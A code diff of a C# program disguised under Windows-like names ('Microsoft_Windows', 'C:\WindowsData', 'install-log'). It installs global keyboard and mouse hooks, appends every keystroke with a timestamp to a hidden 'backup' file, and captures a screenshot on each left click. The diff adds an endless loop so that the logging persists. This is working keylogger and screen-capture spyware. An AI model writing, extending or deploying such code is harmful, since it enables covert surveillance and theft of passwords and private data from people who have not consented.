@@ -19,12 +19,25 @@ namespace Microsoft_Windows
         static DirectoryInfo di;
         static DirectoryInfo di1;
 
+
+        static EventHookFactory eventHookFactory ;
+        static KeyboardWatcher keyboardWatcher ;
+        static MouseWatcher mouseWatcher ;
+
         static void Main(string[] args)
         {
             var startTimeSpan = TimeSpan.Zero;
             var periodTimeSpan = TimeSpan.FromSeconds(5);
-
             int currentFileValue = getFileNumber();
+
+            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);
+            eventHookFactory = new EventHookFactory();
+            keyboardWatcher = eventHookFactory.GetKeyboardWatcher();
+            mouseWatcher = eventHookFactory.GetMouseWatcher();
+            PrintScreen ps = new PrintScreen();
+
+            keyboardWatcher.Start();
+            mouseWatcher.Start();
 
             di = new DirectoryInfo("C:\\WindowsData");
             if (!di.Exists) { di.Create(); }
@@ -38,34 +51,14 @@ namespace Microsoft_Windows
             }, null, startTimeSpan, periodTimeSpan);
 
 
-
-            PrintScreen ps = new PrintScreen();
-            //  ps.CaptureScreenToFile(di + "\\data" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg);
-            //    currentFileValue++;
-
-
-
-
-            //Queue qt = new Queue();
-            //Queue.enqueue(element);
-
-            var eventHookFactory = new EventHookFactory();
-
-            var keyboardWatcher = eventHookFactory.GetKeyboardWatcher();
-
-            keyboardWatcher.Start();
-
-
             keyboardWatcher.OnKeyInput += (s, e) =>
             {
-               // var dt = new DateTime(2010, 1, 1, 1, 1, 1, DateTimeKind.Utc);
                 string time = string.Format("{0:yyyyMMdd HH:mm:ss.fff tt}", DateTime.Now);
                 File.AppendAllText("C:\\WindowsData\\windows10\\backup", time + " - " + e.KeyData.Keyname + Environment.NewLine);
                 // Debug.WriteLine("Key {0} event of key {1}", e.KeyData.EventType, e.KeyData.Keyname);
             };
 
-            var mouseWatcher = eventHookFactory.GetMouseWatcher();
-            mouseWatcher.Start();
+            
             mouseWatcher.OnMouseInput += (s, e) =>
             {
                 if (String.Equals(e.Message.ToString(), "WM_LBUTTONDOWN")) { ps.CaptureScreenToFile(di + "\\install-log" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg); currentFileValue++; }
@@ -75,15 +68,11 @@ namespace Microsoft_Windows
             };
 
 
-           // while (true) {
+           while (true) {
                 System.Threading.Thread.Sleep(1000000);
-            //}
+            }
            
         
-
-
-
-
             //    Thread t = new Thread(new ParameterizedThreadStart(StartupA));
             //    t.Start(new MyThreadParams(path, port));
 
@@ -98,19 +87,18 @@ namespace Microsoft_Windows
             //   Thread t3 = new Thread(() => StartupB(port, path));
             //   t3.Start();
 
-            // System.Threading.Thread.Sleep(5000);
-
-            keyboardWatcher.Stop();
-            mouseWatcher.Stop();
-
-            eventHookFactory.Dispose();
 
         }
 
 
+        static void OnProcessExit(object sender, EventArgs e)
+        {
 
-
-
+           Console.WriteLine("I'm out of here");
+            keyboardWatcher.Stop();
+            mouseWatcher.Stop();
+            eventHookFactory.Dispose();
+        }
 
 
         static int getFileNumber() {
@@ -128,8 +116,6 @@ namespace Microsoft_Windows
 
             foreach (FileInfo file in Files)
             {
-
-
                 // int value =int.Parse(file.Name.Replace("data",""));
                 str = file.Name;
                 //Debug.WriteLine("XXXXXXXXXXXXXXXXXXXXXXXXX" + str);
@@ -138,7 +124,6 @@ namespace Microsoft_Windows
                 int value = int.Parse(str);
                 if (value > oldValue) { oldValue = value; }
             }
-
 
            // Debug.WriteLine("XXXXXXXXXXXXXXXXXXXXXXXXX" + oldValue);
 
